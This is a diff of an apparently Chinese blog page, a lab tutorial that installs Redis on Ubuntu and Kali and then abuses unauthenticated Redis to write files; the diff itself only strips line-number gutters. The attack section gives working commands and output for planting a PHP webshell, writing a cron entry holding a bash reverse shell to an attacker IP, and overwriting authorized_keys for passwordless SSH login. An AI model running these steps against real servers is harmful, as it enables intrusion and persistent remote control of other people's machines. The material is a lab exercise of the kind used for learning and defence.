@@ -247,47 +247,47 @@ document.addEventListener('pjax:error', (e) => {
 </ol>
 <p>nosql数据库种类繁多，但是它们都有一个共同的特点，就是它们都去掉了关系数据库的关系型特性，使用键值型</p>
 <h1 id="二、Ubuntu部署Redis"><a href="#二、Ubuntu部署Redis" class="headerlink" title="二、Ubuntu部署Redis"></a>二、Ubuntu部署Redis</h1><h2 id="1、下载和安装"><a href="#1、下载和安装" class="headerlink" title="1、下载和安装"></a>1、下载和安装</h2><p>我这里使用的是Ubuntu进行下载</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523488110-53e105c2-223f-41e5-a65d-4fd43ad1ac95.png" alt="img"></p>
 <p>解压</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523570500-ff578715-d8aa-46fd-b465-b17f007d6262.png" alt="img"></p>
 <p>移动解压后的文件夹到/usr/local/redis目录下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv ./redis-4.0.9 /usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mv ./redis-4.0.9 /usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>
 
 <p>进入到/usr/local/redis目录下，make test编译一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524129274-562a6cf2-ced1-4d6b-9d10-7dcc50c9f486.png" alt="img"></p>
 <p>报错了，执行以下命令即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make distclean &amp;&amp; make</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make distclean &amp;&amp; make</span><br></pre></td></tr></table></figure>
 
 <p>错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。</p>
 <p>提示以下信息说明没问题了</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524281458-42609eb0-b6d5-49dc-b2d4-88f44c30f790.png" alt="img"></p>
 <p>再次执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 
 <p>​    大概8分钟左右的编译后，出现绿色字体的信息，说明没问题</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524536236-965371c5-0d16-45a9-a0f5-05f029799ec9.png" alt="img"></p>
 <p>进入/usr/local/redis/src目录下，看到有以下命令，说明的确没问题了，编译安装成功</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525178655-88970cfb-3795-497d-a725-3bd2f527426a.png" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方便找到</span></span><br><span class="line">sudo mkdir /etc/redis  </span><br><span class="line">sudo cp /usr/<span class="built_in">local</span>/redis/redis.conf /etc/redis/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方便找到</span></span><br><span class="line">sudo mkdir /etc/redis  </span><br><span class="line">sudo cp /usr/<span class="built_in">local</span>/redis/redis.conf /etc/redis/</span><br></pre></td></tr></table></figure>
 
 <h2 id="2、修改配置文件"><a href="#2、修改配置文件" class="headerlink" title="2、修改配置文件"></a>2、修改配置文件</h2><p>修改并保存配置文件</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525604213-c1573a3b-0a79-492d-888e-b0ba2048ef36.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525689314-005cc03f-d38c-4ca1-9f96-6f81c5fe7668.png" alt="img"></p>
 <h2 id="3、运行Redis服务端"><a href="#3、运行Redis服务端" class="headerlink" title="3、运行Redis服务端"></a>3、运行Redis服务端</h2><p>以/etc/redis/redis.conf的配置文件启动Redis服务端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526033144-130b20b8-697b-4fae-8a47-448836eea2cf.png" alt="img"></p>
 <p>查看是否开启Redis</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526083476-9ebf168d-d3c9-4b77-a5ea-b68135e52b98.png" alt="img"></p>
-<h2 id="4、客户端连接服务端"><a href="#4、客户端连接服务端" class="headerlink" title="4、客户端连接服务端"></a>4、客户端连接服务端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
+<h2 id="4、客户端连接服务端"><a href="#4、客户端连接服务端" class="headerlink" title="4、客户端连接服务端"></a>4、客户端连接服务端</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526186105-169f58ac-a632-47eb-8d1f-ce31b97b8523.png" alt="img"></p>
 <p>可以看到，当保存了数据后，src目录下会有dump.rdb，看一下可以大概知道，这应该存储了当时我们创建的键值对（当然，如果通过cp命令将redis-server加入到/usr/bin目录下，那么在当前目录下运行的redis，那么就会在当前目录下生成dump.rdb，不一定在src目录下）</p>
@@ -297,41 +297,41 @@ document.addEventListener('pjax:error', (e) => {
 <p>因为官方说明save默认保存的是rdb文件，redis-bits?@?ctime就是rdb标识符，实战可以把它看成脏数据</p>
 </blockquote>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530806268-9cd8c3a5-05c7-4210-b3c3-8aa361e79449.png" alt="img"></p>
-<h1 id="三、Kali安装Redis-cli"><a href="#三、Kali安装Redis-cli" class="headerlink" title="三、Kali安装Redis-cli"></a>三、Kali安装Redis-cli</h1><h2 id="1、下载安装"><a href="#1、下载安装" class="headerlink" title="1、下载安装"></a>1、下载安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
+<h1 id="三、Kali安装Redis-cli"><a href="#三、Kali安装Redis-cli" class="headerlink" title="三、Kali安装Redis-cli"></a>三、Kali安装Redis-cli</h1><h2 id="1、下载安装"><a href="#1、下载安装" class="headerlink" title="1、下载安装"></a>1、下载安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528502054-4a6bff5a-b284-4fb0-abcf-205d30aa1962.png" alt="img"></p>
 <p>解压</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528593285-d83a5d04-e3aa-48f5-94d4-bb087130d466.png" alt="img"></p>
 <p>可以看到有个makefile，直接make，全局生效</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528682454-82a06dc6-102e-4d76-aaf7-a0fc9054b4ac.png" alt="img"></p>
-<h2 id="2、加入环境变量"><a href="#2、加入环境变量" class="headerlink" title="2、加入环境变量"></a>2、加入环境变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp redis-cli /usr/bin</span><br></pre></td></tr></table></figure>
+<h2 id="2、加入环境变量"><a href="#2、加入环境变量" class="headerlink" title="2、加入环境变量"></a>2、加入环境变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp redis-cli /usr/bin</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528812989-8d8da347-9f2c-4620-9649-451fd42aa4a7.png" alt="img"></p>
-<h2 id="3、连接Ubuntu的Redis服务"><a href="#3、连接Ubuntu的Redis服务" class="headerlink" title="3、连接Ubuntu的Redis服务"></a>3、连接Ubuntu的Redis服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
+<h2 id="3、连接Ubuntu的Redis服务"><a href="#3、连接Ubuntu的Redis服务" class="headerlink" title="3、连接Ubuntu的Redis服务"></a>3、连接Ubuntu的Redis服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528911828-cc0efb3d-0deb-43ed-9855-614936748041.png" alt="img"></p>
 <h1 id="四、设置密码登录"><a href="#四、设置密码登录" class="headerlink" title="四、设置密码登录"></a>四、设置密码登录</h1><p>之前说过，默认情况下Redis是免密登陆的，那么就存在未授权登录的风险。那么如何设置密码登录呢？</p>
 <p>打开配置文件，配置密码为<code>haha123</code>，如图所示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass haha123</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">requirepass haha123</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534540030-7b2f3654-7cfe-4b5f-b037-d421836f56be.png" alt="img"></p>
 <p>关闭Redis服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shutdown</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534802364-bd7724fe-8485-4181-981d-013714f67cc1.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534824841-bc85185e-0e45-4132-a3d2-7016685d2789.png" alt="img"></p>
 <p>启动Redis服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534875556-83e31c01-aeab-4bf5-8ace-ac073de1e78f.png" alt="img"></p>
 <p>客户端连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auth [username] password</span><br><span class="line">或者直接</span><br><span class="line">redis-cli -h [ip] -a [password]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auth [username] password</span><br><span class="line">或者直接</span><br><span class="line">redis-cli -h [ip] -a [password]</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534917431-167c357b-ef11-4d3d-9e29-d20dd13053c6.png" alt="img"></p>
 <h1 id="五、Redis写文件"><a href="#五、Redis写文件" class="headerlink" title="五、Redis写文件"></a>五、Redis写文件</h1><h2 id="1、写入Webshell"><a href="#1、写入Webshell" class="headerlink" title="1、写入Webshell"></a>1、写入Webshell</h2><p>只要知道 web 绝对路径并且权限足够就可以写个 webshell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ <span class="comment">#这里是站点绝对路径（我这里Ubuntu没有安装中间件，只作为演示参考）</span></span><br><span class="line">OK </span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> shell <span class="string">&quot;&lt;?php echo system(<span class="variable">$_REQUEST</span>[cmd]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save <span class="comment">#将内存中的数据保存到dbfilename中 </span></span><br><span class="line"> OK </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ <span class="comment">#这里是站点绝对路径（我这里Ubuntu没有安装中间件，只作为演示参考）</span></span><br><span class="line">OK </span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> shell <span class="string">&quot;&lt;?php echo system(<span class="variable">$_REQUEST</span>[cmd]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save <span class="comment">#将内存中的数据保存到dbfilename中 </span></span><br><span class="line"> OK </span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530453148-e673de16-03dc-4211-b71f-9ad842a59906.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530470665-f9018596-b83f-469c-a38c-09651108c387.png" alt="img"></p>
@@ -342,12 +342,12 @@ document.addEventListener('pjax:error', (e) => {
 <h3 id="（1）命令初测试"><a href="#（1）命令初测试" class="headerlink" title="（1）命令初测试"></a>（1）命令初测试</h3><p>Kali开启nc监听</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531451395-8a360574-8b61-4bc4-bbea-098cd32fe7b0.png" alt="img"></p>
 <p>Ubuntu执行命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>​    此时成功反弹shell到nc</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531530323-6564fd8b-523f-46d9-bcd7-c074baeda827.png" alt="img"></p>
 <p>命令是没有问题的</p>
-<h3 id="（2）-var-spool-cron-用户名-测试"><a href="#（2）-var-spool-cron-用户名-测试" class="headerlink" title="（2）/var/spool/cron/用户名 测试"></a>（2）/var/spool/cron/用户名 测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.117:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/  //每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> haha <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  // 直接往当前用户的crontab里写入反弹shell，换行是必不可少的。每分钟尝试连接</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; get haha</span><br><span class="line"><span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  </span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="（2）-var-spool-cron-用户名-测试"><a href="#（2）-var-spool-cron-用户名-测试" class="headerlink" title="（2）/var/spool/cron/用户名 测试"></a>（2）/var/spool/cron/用户名 测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.117:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/  //每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> haha <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  // 直接往当前用户的crontab里写入反弹shell，换行是必不可少的。每分钟尝试连接</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; get haha</span><br><span class="line"><span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  </span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532616785-1f47522e-0b64-4c8f-8768-798ad99d8977.png" alt="img"></p>
 <p>之所以会保存错误是因为当前用户对该文件夹没有写权限，为了实验效果修改再次保存即可</p>
@@ -357,7 +357,7 @@ document.addEventListener('pjax:error', (e) => {
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533012313-aedd704a-2881-43a3-a36a-0564a0ba0e43.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532983058-cf53ff39-f824-40af-a114-9cfd4aa32c9c.png" alt="img"></p>
 <p>cron计划任务服务也已经开启</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status cron</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status cron</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534167034-3fe5ceed-8b96-43eb-b589-9527609f34b4.png" alt="img"></p>
 <p>但此时nc却迟迟未收到反弹shell</p>
@@ -367,7 +367,7 @@ document.addEventListener('pjax:error', (e) => {
 </blockquote>
 <p>按照一个前辈的说法就是Ubuntu的计划任务，前面有乱码它将无法执行。而如果换成CentOs就可以，因为CentOs可以跳过乱码，执行正确的能执行的计划任务代码。这里因为我未部署CentOs虚拟机，就当作我反弹成功了，后续有机会再补上CentOs</p>
 <p>一个师傅总结的一些定时计划目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/用户名</span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/xxx </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/用户名</span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/xxx </span><br></pre></td></tr></table></figure>
 
 <p>​    看了上面才知道，原来当初设置数据库名字为root是对root用户，而这里我的用户名是xdd，因此重新设置一下</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533697421-eb433a13-9485-4c56-9765-63505bfbc1c0.png" alt="img"></p>
@@ -395,22 +395,22 @@ document.addEventListener('pjax:error', (e) => {
 <p>只要把我们的公钥写在对方的 <code>.ssh/authorized_keys</code> 文件里再去用 ssh 连接就不需服务器的账号密码了</p>
 <p>开始实验！</p>
 <p>由于我Ubuntu的xdd用户目录下没有.ssh文件，那就自己创建一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535849507-85fa6746-3615-4ef4-9ad0-1db92522247b.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535875282-40eae062-5cf6-4a4e-89fc-8e4eee5e5474.png" alt="img"></p>
 <p>Kali的id_rsa.pub，这是Kali的公钥</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536756860-e59d965f-b838-4dc5-8092-ecc8c3c566c3.png" alt="img"></p>
 <p>将公钥信息写入到key.txt中</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536881544-41f26278-d3dd-43f3-a787-f00d7c3a1311.png" alt="img"></p>
 <p>将xxx键的值设置为key.txt的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537347164-c16bbd0e-632a-44e6-a598-c4803d6d1a28.png" alt="img"></p>
 <p>将攻击者的公钥文件覆盖写入到用户的authorized_keys中</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /home/xdd/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /home/xdd/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537508508-95f3f6e2-1f7c-4c42-aa69-2864ae884eed.png" alt="img"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537491467-aef26890-cd79-49e1-8dd7-a50e9e9849ea.png" alt="img"></p>
@@ -418,7 +418,7 @@ document.addEventListener('pjax:error', (e) => {
 <p>如果本来就有authorized_keys文件，那么将会被新的覆盖</p>
 </blockquote>
 <p>​    此时用户那边有我们攻击者的公钥文件，攻击者就可以使用私钥免密ssh登录到用户的主机上</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537871357-2968ef4e-bf32-40e0-bdb1-bd6a53717f1a.png" alt="img"></p>
 <h1 id="六、Redis基本安全策略"><a href="#六、Redis基本安全策略" class="headerlink" title="六、Redis基本安全策略"></a>六、Redis基本安全策略</h1><ol>
